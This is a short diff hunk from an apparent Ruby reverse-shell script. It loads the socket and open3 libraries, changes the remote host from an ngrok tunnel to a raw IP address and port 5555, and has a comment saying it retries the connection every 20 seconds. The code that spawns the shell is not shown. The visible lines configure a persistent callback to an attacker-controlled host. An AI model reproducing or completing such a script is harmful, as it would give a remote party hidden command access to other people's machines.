@@ -4,9 +4,9 @@ require 'socket'
 require 'open3'
 
 #Set the Remote Host IP
-RHOST = "//2.tcp.ngrok.io" 
+RHOST = "//88.225.219.22" 
 #Set the Remote Host Port
-PORT = "16892"
+PORT = "5555"
 
 #Tries to connect every 20 sec until it connects.
 begin
